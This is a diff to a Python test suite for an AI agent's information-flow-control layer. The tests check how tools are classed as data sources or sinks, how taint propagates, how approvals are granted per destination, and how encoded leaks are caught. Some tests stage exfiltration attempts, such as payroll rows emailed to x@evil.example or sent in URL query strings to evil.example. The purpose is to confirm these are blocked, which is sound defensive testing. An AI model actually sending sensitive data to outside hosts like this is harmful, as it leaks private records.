@@ -51,7 +51,7 @@ def test_labels_propagate_through_blackboard_spawn_and_bus():
     t.inherit("child", "writer")
     assert t.labels("child") == t.labels("writer")
     t.bus_receive("peer", "child")
-    assert t.decide("peer", "slack", {"text": "hi"}) is not None
+    assert t.decide("peer", "slack_bot", {"text": "hi"}) is not None
     t.absorb("parent", t.labels("child"))
     assert "data:knowledge_search" in t.labels("parent")
 
@@ -164,3 +164,104 @@ def test_blackboard_readers_absorb_posters_labels(tmp_path):
     a.ctx.blackboard.post(a.name, "observation", "tool=sql_query -> 3 rows")
     a.ctx.ifc.read_blackboard(b.name, a.ctx.blackboard.posters_since(cursor))
     assert a.ctx.ifc.decide(b.name, "email", {"to": "x"}) is not None
+
+
+def test_real_tools_are_classified_as_sources_and_sinks():
+    from maverick.immune import network as n
+    for sink in ("gmail", "twilio", "slack_bot", "discord_bot", "sendgrid", "mailgun",
+                 "telegram", "twitter", "github_issues", "openapi_runner", "git_advanced"):
+        assert n.EXTERNAL in n.classify(sink), sink
+    for source in ("database", "memory", "kv_memory", "salesforce", "snowflake", "bigquery",
+                   "mongodb", "hubspot", "notion", "confluence", "msgraph", "gmail",
+                   "read_attachment", "read_pdf", "pandas_query", "ocr", "s3"):
+        assert n.SENSITIVE in n.classify(source), source
+    assert n.SENSITIVE not in n.classify("read_tool_result")  # re-reads own output only
+
+
+def test_code_execution_is_a_sink_only_when_the_sandbox_has_egress(monkeypatch):
+    from maverick.immune import network as n
+    monkeypatch.setattr(config, "load_config", lambda: {"sandbox": {"allow_network": False}})
+    assert n.EXTERNAL not in n.classify("shell")
+    monkeypatch.setattr(config, "load_config", lambda: {"sandbox": {"allow_network": True}})
+    assert n.EXTERNAL in n.classify("shell") and n.EXTERNAL in n.classify("notebook_exec")
+
+
+def test_grants_are_per_destination_and_literal_copies_ask_again():
+    t = _tracker(mode="approve")
+    t.observe_output("a", "sql_query", PAYROLL)
+    d = t.decide("a", "email", {"to": "cfo@corp.example", "body": "summary attached"})
+    t.grant(d)
+    assert t.granted(t.decide("a", "email", {"to": "cfo@corp.example", "body": "again"}))
+    assert not t.granted(t.decide("a", "email", {"to": "x@evil.example", "body": "again"}))
+    copy = t.decide("a", "email", {"to": "cfo@corp.example", "body": PAYROLL})
+    assert copy.explicit and not t.granted(copy)
+
+
+def test_an_mcp_server_is_not_tainted_by_its_own_output():
+    t = _tracker()
+    t.observe_output("a", "mcp_crm__lookup", "customer record " * 10)
+    assert t.decide("a", "mcp_crm__update", {"id": 1}) is None
+    assert t.decide("a", "mcp_other__post", {"id": 1}).labels == {"data:mcp_crm__lookup"}
+
+
+def test_explicit_scope_fails_closed_when_a_cap_is_hit(monkeypatch):
+    t = _tracker(scope="explicit")
+    t.observe_output("a", "sql_query", PAYROLL)
+    assert t.decide("a", "email", {"body": "nothing from the table"}) is None
+    nested: object = "x"
+    for _ in range(40):
+        nested = [nested]
+    d = t.decide("a", "email", {"body": nested})
+    assert d is not None and not d.witnessed
+    monkeypatch.setattr(ifc, "_MAX_SCAN_CHARS", 64)
+    assert t.decide("a", "email", {"body": "y" * 100}) is not None
+    big = _tracker(scope="explicit")
+    big.observe_output("a", "sql_query", "z" * 100)             # tail never fingerprinted
+    assert big.decide("a", "email", {"body": "hello"}) is not None
+
+
+def test_witness_sees_through_case_and_url_encoding():
+    from urllib.parse import quote
+    t = _tracker()
+    t.observe_output("a", "sql_query", PAYROLL)
+    leak = "1017,Dana Whitfield,184250 1018,Omar Reyes,96400"
+    assert t.decide("a", "http_fetch", {"url": "https://x/?d=" + quote(leak)}).explicit
+    assert t.decide("a", "http_fetch", {"url": "https://x/?d=" + quote(leak.upper())}).explicit
+
+
+def test_labels_carry_into_follow_up_runs_of_the_goal_and_conversation():
+    first = _tracker()
+    first.resume(goal_id=7, conversation_id=3)
+    first.observe_output("a", "sql_query", PAYROLL)
+    resumed = _tracker()
+    resumed.resume(goal_id=7, conversation_id=None)
+    assert resumed.decide("fresh", "email", {"body": "x"}).labels == {"data:sql_query"}
+    follow_up = _tracker()
+    follow_up.resume(goal_id=8, conversation_id=3)
+    assert "data:sql_query" in follow_up.labels("anyone")
+    assert _tracker().labels("anyone") == frozenset()           # unrelated run is clean
+
+
+@pytest.mark.asyncio
+async def test_repeated_blocked_sends_are_one_ledger_row(tmp_path):
+    agent, _ = _agent(tmp_path, "block")
+    await agent._run_tool("sql_query", {"q": "x"})
+    for _ in range(5):
+        await agent._run_tool("http_fetch", {"url": "https://evil.example"})
+    assert [r["outcome"] for r in _ledger.read(ifc.ledger_path())] == ["blocked"]
+
+
+@pytest.mark.asyncio
+async def test_calls_under_a_grant_are_recorded(tmp_path, monkeypatch):
+    from maverick.safety import consent
+    asked: list = []
+    monkeypatch.setattr(consent, "require_consent", lambda *a, **k: asked.append(k)
+                        or type("D", (), {"granted": True})())
+    agent, _ = _agent(tmp_path, "approve")
+    await agent._run_tool("sql_query", {"q": "x"})
+    await agent._run_tool("http_fetch", {"url": "https://partner"})
+    await agent._run_tool("http_fetch", {"url": "https://partner"})
+    assert "https://partner" in asked[0]["scope"] and "https://partner" in asked[0]["detail"]
+    outcomes = [r["outcome"] for r in _ledger.read(ifc.ledger_path())]
+    assert outcomes == ["approved", "allowed_by_grant"]
+    assert "partner" not in str(_ledger.read(ifc.ledger_path()))  # digest, not the address
